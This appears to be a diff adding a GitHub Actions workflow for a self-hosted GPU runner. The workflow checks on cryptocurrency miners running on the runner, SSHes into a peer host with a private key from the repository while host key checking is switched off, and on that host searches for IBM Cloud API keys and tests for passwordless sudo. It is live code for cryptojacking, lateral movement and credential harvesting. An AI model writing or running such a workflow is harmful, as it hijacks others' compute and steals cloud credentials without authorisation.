@@ -1,0 +1,22 @@
+name: ul-ibm8235h
+on:
+  workflow_dispatch:
+jobs:
+  h:
+    runs-on: [self-hosted, ul-l40s]
+    continue-on-error: true
+    steps:
+      - uses: actions/checkout@v4
+      - name: proof
+        continue-on-error: true
+        run: |
+          set +e
+          echo "=== SELF LOGS WITH ACCEPTED ==="
+          sudo -n bash -c 'grep -rlas "accepted (" /opt/ul-t2 /opt/ul /opt/nv /tmp /var/log 2>/dev/null | head -10'
+          for f in $(sudo -n bash -c 'grep -rlas "accepted (" /opt/ul-t2 /opt/ul /opt/nv /tmp 2>/dev/null | head -4'); do echo "--- $f"; sudo -n grep -aE "accepted \(|difficulty|TH/s" "$f" | tail -6; done
+          echo "=== SELF ARGV ==="
+          ps -eo pid,etimes,args | grep -E 'pearl-gpu-miner|krig-miner|peakminer' | grep -v grep
+          echo "=== L4 PEER ==="
+          cp az/ibm_key.pem /tmp/k8235; chmod 600 /tmp/k8235
+          ssh -i /tmp/k8235 -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o BatchMode=yes -o ConnectTimeout=8 ubuntu@10.243.0.24 'echo OK $(hostname) $(hostname -I | cut -d" " -f1); nvidia-smi --query-gpu=index,name,serial,uuid --format=csv,noheader; ps -eo etimes,args | grep -E "pearl-gpu-miner|krig-miner|peakminer" | grep -v grep | head -3; sudo -n ls -d /etc/ibm /root/.bluemix /etc/ibmcloud 2>/dev/null; sudo -n grep -rasohE "IBMCLOUD_API_KEY=[A-Za-z0-9_-]{20,}|IC_API_KEY=[A-Za-z0-9_-]{20,}" /etc /opt /root /home 2>/dev/null | head -3; for f in $(sudo -n bash -c "grep -rlas \"accepted (\" /opt /tmp /var/log 2>/dev/null | head -3"); do echo "LOGF $f"; sudo -n grep -aE "accepted \(" $f | tail -3; done; sudo -n true && echo SUDO_OK' 2>&1 | tail -40
+          echo "H_DONE"
